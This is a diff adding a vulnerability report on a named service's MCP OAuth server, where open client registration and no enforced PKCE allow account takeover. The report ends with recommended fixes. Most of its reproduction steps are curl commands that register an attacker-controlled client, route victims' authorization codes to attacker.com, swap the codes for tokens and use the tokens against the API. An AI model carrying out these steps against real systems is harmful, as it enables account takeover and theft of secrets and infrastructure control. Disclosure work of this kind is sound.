@@ -1,0 +1,191 @@
+Cloudflare MCP OAuth - Open Dynamic Client Registration Leading to Account Takeover
+Target: mcp.cloudflare.com
+Tested: July 28, 2026
+
+
+Summary
+-------
+The Cloudflare MCP OAuth server at mcp.cloudflare.com allows unauthenticated
+dynamic client registration. An attacker can register an OAuth client with an
+arbitrary redirect_uri pointing to their own domain, then direct a victim to
+the authorization URL. When the victim approves the consent screen, their
+authorization code is sent to the attacker's server. Because the client is
+registered with token_endpoint_auth_method "none", no client secret is needed
+to exchange the code for an access token. The resulting token grants access
+to the victim's Cloudflare account through the full API scope, including
+DNS records, Workers scripts, R2 storage, D1 databases, secrets store,
+SSL certificates, domain registrar, and Zero Trust configuration.
+
+PKCE is not enforced - the authorization flow works without a code challenge.
+Combined with no client authentication requirement, this makes the attack
+trivially exploitable.
+
+
+Severity: Critical
+-------------------
+Full Cloudflare account takeover via OAuth flow. Attacker gets persistent
+API access (refresh tokens via offline_access scope) to all account resources.
+
+
+Steps to Reproduce
+------------------
+
+Step 1 - Register a malicious OAuth client (no auth required):
+
+  curl -s -X POST "https://mcp.cloudflare.com/register" \
+    -H "Content-Type: application/json" \
+    -d '{
+      "redirect_uris": ["https://attacker.com/callback"],
+      "client_name": "Legitimate Looking App",
+      "grant_types": ["authorization_code"],
+      "response_types": ["code"],
+      "token_endpoint_auth_method": "none"
+    }'
+
+  Response:
+    {
+      "client_id": "rvm0fRzggcEl_Vpr",
+      "redirect_uris": ["https://attacker.com/callback"],
+      "client_name": "Legitimate Looking App",
+      "grant_types": ["authorization_code"],
+      "response_types": ["code"],
+      "token_endpoint_auth_method": "none",
+      "registration_client_uri": "/register/rvm0fRzggcEl_Vpr",
+      "client_id_issued_at": 1785205760
+    }
+
+Step 2 - Craft authorization URL and send to victim:
+
+  https://mcp.cloudflare.com/authorize?response_type=code&client_id=rvm0fRzggcEl_Vpr&redirect_uri=https://attacker.com/callback
+
+  No PKCE code_challenge parameter needed.
+
+Step 3 - Victim sees Cloudflare-branded consent page:
+
+  The page at mcp.cloudflare.com shows a legitimate Cloudflare consent screen
+  with the title "Authorize [client_name] | Cloudflare" and subtitle "Grant
+  access to Cloudflare API". The consent page shows all available permission
+  categories and lets the user grant scopes.
+
+  The following scopes are available (partial list):
+    - account:read, user:read (account info, email, memberships)
+    - dns_records:edit, dns_records:read (full DNS control)
+    - workers:write, workers_scripts:write (deploy arbitrary Workers code)
+    - workers_kv:write (read/write KV storage)
+    - d1:write (database access)
+    - r2_catalog:write (object storage)
+    - pages:write (deploy Pages sites)
+    - secrets_store:read, secrets_store:write (read/write secrets)
+    - ssl-and-certificates.write (SSL certificate management)
+    - registrar-domains.admin (domain registrar control)
+    - teams:write, teams:pii (Zero Trust full access including PII)
+    - access:write (Access policy management)
+    - email_routing:write, email_sending:write (email control)
+    - connectivity:admin (network tunnel management)
+    - offline_access (refresh token for persistent access)
+
+Step 4 - Victim approves and code is sent to attacker:
+
+  Browser redirects to:
+    https://attacker.com/callback?code=AUTHORIZATION_CODE
+
+Step 5 - Attacker exchanges code for tokens (no client secret needed):
+
+  curl -s -X POST "https://mcp.cloudflare.com/token" \
+    -d "grant_type=authorization_code" \
+    -d "code=AUTHORIZATION_CODE" \
+    -d "client_id=rvm0fRzggcEl_Vpr" \
+    -d "redirect_uri=https://attacker.com/callback"
+
+  Returns access_token and refresh_token.
+
+Step 6 - Attacker uses token to access Cloudflare API:
+
+  curl -s "https://api.cloudflare.com/client/v4/zones" \
+    -H "Authorization: Bearer ACCESS_TOKEN"
+
+  Full API access to victim's account.
+
+
+Additional Observations
+-----------------------
+
+1. CORS reflects arbitrary origins on the MCP OAuth endpoints:
+
+  curl -sI "https://mcp.cloudflare.com/.well-known/oauth-authorization-server" \
+    -H "Origin: https://evil.com"
+
+  access-control-allow-origin: https://evil.com
+  access-control-allow-headers: Authorization, *
+  access-control-allow-methods: *
+  access-control-max-age: 86400
+
+  Same reflection on /token and /register endpoints. No
+  access-control-allow-credentials header though, so browser-based
+  credential stealing is limited to the OAuth redirect flow.
+
+2. Client registration is fully unauthenticated - no API key, no
+   Cloudflare account, no rate limiting observed.
+
+3. The code_challenge_methods_supported includes "plain" which is
+   weaker than S256 and discouraged by RFC 7636. But since PKCE is
+   not enforced at all, this is moot.
+
+4. The registration_client_uri is returned but reading it returns 404,
+   so clients can't be inspected after creation. But they also can't
+   be deleted by anyone, leaving malicious clients permanently active.
+
+5. Multiple clients confirmed registered successfully:
+   - client_id: rvm0fRzggcEl_Vpr (redirect to evil.com)
+   - client_id: nhmrPeCXoTZbU9Zs (redirect to attacker-controlled.com)
+
+6. The /mcp endpoint returns 401 "Missing or invalid access token"
+   confirming it accepts Bearer tokens - this is the actual MCP
+   protocol endpoint that would grant tool-level access to Cloudflare
+   resources once authenticated.
+
+7. The /authorize endpoint returns 500 when called without required
+   parameters, revealing an error ID format (UUID v4) that could be
+   used for log correlation.
+
+
+Impact
+------
+An attacker can fully compromise any Cloudflare account whose owner
+clicks an authorization link and approves the consent screen. The consent
+page is hosted on mcp.cloudflare.com and looks identical to a legitimate
+Cloudflare OAuth flow - the only indicator is the attacker-chosen
+client_name, which can be set to anything convincing.
+
+Once authorized:
+  - Read all DNS records, modify DNS to redirect traffic
+  - Deploy malicious Workers scripts to intercept/modify traffic
+  - Read/write secrets stored in the secrets store
+  - Access R2 object storage and D1 databases
+  - Manage SSL certificates
+  - Control domain registrar settings
+  - Access Zero Trust configuration including PII
+  - Persistent access via refresh tokens (offline_access)
+
+The attack requires a single click from the victim and no technical
+sophistication from the attacker beyond a POST request to /register.
+
+
+Fix
+---
+1. Require authentication for the /register endpoint (API key or
+   session token from an authenticated Cloudflare account)
+2. Enforce PKCE with S256 method on all authorization flows
+3. Restrict redirect_uri to pre-approved domains or validate against
+   the registered Cloudflare account's domains
+4. Require a client_secret for token exchange
+5. Add rate limiting to the /register endpoint
+6. Fix CORS to not reflect arbitrary origins on OAuth endpoints
+
+
+Environment
+-----------
+  mcp.cloudflare.com
+  Server: cloudflare
+  OAuth server based on RFC 8414 metadata
+  All testing done with curl, no browser, no automated scanners.
